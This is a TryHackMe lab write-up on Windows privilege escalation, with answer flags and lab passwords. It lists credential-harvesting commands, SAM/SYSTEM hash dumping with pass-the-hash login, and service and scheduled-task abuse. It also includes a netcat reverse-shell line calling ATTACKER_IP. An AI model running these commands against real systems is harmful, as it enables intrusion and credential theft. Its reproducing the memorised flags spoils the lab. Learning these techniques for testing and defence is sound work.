# **Windows Privilege Escalation – TryHackMe Lab Writeup**

---

## **1\. Overview**

Windows Privilege Escalation is the process of gaining higher-level permissions on a Windows system by exploiting misconfigurations, insecure services, or vulnerable software. Attackers typically start with a low-privileged user and gradually escalate to Administrator or SYSTEM privileges.

This lab demonstrates multiple real-world escalation techniques commonly encountered in penetration testing and CTF environments.

---

## **2\. Objectives of the Lab**

* Understand Windows user privilege hierarchy  
* Identify common credential storage locations  
* Exploit misconfigured scheduled tasks  
* Abuse weak Windows service permissions  
* Perform privilege escalation using:  
  * Unquoted service paths  
  * Writable service binaries  
  * Insecure service configurations  
  * Vulnerable installed software

---

## **3\. Windows User Types**

### **User Accounts**

* **Administrators**  
  * Full control over system configuration and files  
  * Can install software and modify security settings  
* **Standard Users**  
  * Limited access  
  * Cannot make system-wide changes

### **System Accounts**

* **SYSTEM / LocalSystem**  
  * Highest privilege level in Windows  
  * Used internally by the OS  
* **Local Service**  
  * Minimal privileges  
  * Used for local services  
* **Network Service**  
  * Uses machine credentials for network authentication

---

### **Answers (Task 2\)**

Users that can change system configurations are part of which group?  
 **Administrators**

The SYSTEM account has more privileges than the Administrator user (aye/nay)  
 **aye**

---

## **4\. Credential Harvesting Techniques**

Windows often stores credentials in insecure locations.

### **PowerShell History**

type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt

### **Stored Windows Credentials**

cmdkey /list

### **IIS Configuration Files**

type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString

### **PuTTY Stored Sessions**

reg query HKEY\_CURRENT\_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s  
---

### **Answers (Task 3\)**

PowerShell history password:  
 **ZuperCkretPa5z**

IIS web.config password (db\_admin):  
 **098n0x35skjD3**

Saved Windows credential flag (mike.katz):  
 **THM{WHAT\_IS\_MY\_PASSWORD}**

PuTTY stored password (thom.smith):  
 **CoolPass2021**

---

## **5\. Scheduled Task Privilege Escalation**

Misconfigured scheduled tasks may execute files that a user can modify.

### **Key Commands**

schtasks /query  
icacls C:\\tasks\\schtask.bat

### **Exploitation Method**

* Identify writable scheduled task file  
* Replace with reverse shell payload  
* Trigger task execution

### **Payload Example**

echo c:\\tools\\nc64.exe \-e cmd.exe ATTACKER\_IP 4444 \> C:\\tasks\\schtask.bat

### **Execution**

schtasks /run /tn vulntask  
---

### **Answer (Task 4\)**

Flag:  
 **THM{TASK\_COMPLETED}**

---

## **6\. Windows Services Privilege Escalation**

Windows services run with elevated privileges and can be abused if misconfigured.

---

### **6.1 Writable Service Binary**

Check service:

sc qc WindowsScheduler  
icacls C:\\PROGRA\~2\\SYSTEM\~1\\WService.exe

If writable → replace binary with payload.

### **Exploit Steps**

* Generate payload (msfvenom)  
* Replace service executable  
* Restart service

---

### **Answer (Task 5 \- Q1)**

Flag:  
 **THM{AT\_YOUR\_SERVICE}**

---

### **6.2 Unquoted Service Path Exploit**

When service paths contain spaces and are not quoted:

Example:

C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe

Windows may try:

* C:\\MyPrograms\\Disk.exe  
* C:\\MyPrograms\\Disk Sorter.exe

### **Exploit**

* Place malicious executable in earlier path  
* Trigger service execution

---

### **Answer (Task 5 \- Q2)**

Flag:  
 **THM{QUOTES\_EVERYWHERE}**

---

### **6.3 Insecure Service Permissions**

If service allows reconfiguration:

accesschk64.exe \-qlc THMService

Modify service:

sc config THMService binPath= "payload.exe" obj= LocalSystem

Restart service:

sc stop THMService  
sc start THMService  
---

### **Answer (Task 5 \- Q3)**

Flag:  
 **THM{INSECURE\_SVC\_CONFIG}**

---

## **7\. Advanced Credential Dumping (SAM & SYSTEM)**

### **Steps**

Backup registry hives:

reg save hklm\\system system.hive  
reg save hklm\\sam sam.hive

### **Transfer via SMB**

python3 smbserver.py \-smb2support public share

### **Dump Hashes**

secretsdump.py \-sam sam.hive \-system system.hive LOCAL

### **Remote Login**

psexec.py \-hashes \<hash\> administrator@IP  
---

### **Answer (Task 6\)**

Flag:  
 **THM{SEFLAGPRIVILEGE}**

---

## **8\. Vulnerable Software Exploitation**

### **Example: Druva inSync 6.6.3**

* Identified using:

wmic product get name,version,vendor

### **Exploit Concept**

* Software contains RPC vulnerability  
* Allows execution of system commands  
* Creates admin user

### **Payload Result**

* Creates user: pwnd  
* Adds to Administrators group

---

### **Answer (Task 7\)**

Flag:  
 **THM{EZ\_DLL\_PROXY\_4ME}**

---

## **9\. Additional Tasks**

Task 1: No need  
 Task 8: No need  
 Task 9: No need

---

## **10\. Conclusion**

This lab demonstrates how Windows privilege escalation is primarily achieved through:

* Weak file permissions  
* Misconfigured services  
* Improper scheduling mechanisms  
* Credential leakage  
* Vulnerable third-party software

Understanding these weaknesses is essential for both penetration testers and defenders to secure Windows environments effectively.

---

## **Final Summary of All Flags**

* TASK 3 (mike.katz): THM{WHAT\_IS\_MY\_PASSWORD}  
* TASK 4: THM{TASK\_COMPLETED}  
* TASK 5 Q1: THM{AT\_YOUR\_SERVICE}  
* TASK 5 Q2: THM{QUOTES\_EVERYWHERE}  
* TASK 5 Q3: THM{INSECURE\_SVC\_CONFIG}  
* TASK 6: THM{SEFLAGPRIVILEGE}  
* TASK 7: THM{EZ\_DLL\_PROXY\_4ME}

